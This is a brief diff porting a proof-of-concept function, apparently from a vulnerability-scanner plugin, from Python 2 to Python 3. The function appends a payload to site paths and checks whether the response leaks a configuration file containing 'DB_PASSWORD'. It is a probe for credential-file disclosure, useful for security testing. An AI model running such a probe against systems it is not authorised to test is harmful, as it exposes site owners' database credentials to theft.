@@ -19,7 +19,7 @@ Vendor Homepage
 
 """
 
-import urllib2
+import urllib.request, urllib.error, urllib.parse
 from plugin.urlparser import iterate_path
 
 
@@ -32,9 +32,9 @@ def poc(url):
             continue
         target = i.rstrip('/') + payload
         try:
-            r = urllib2.urlopen(target).read()  # cannot use requests here
+            r = urllib.request.urlopen(target).read()  # cannot use requests here
             if 'define(' in r and 'DB_PASSWORD' in r:
                 return target
-        except Exception, e:
+        except Exception as e:
             pass
     return False
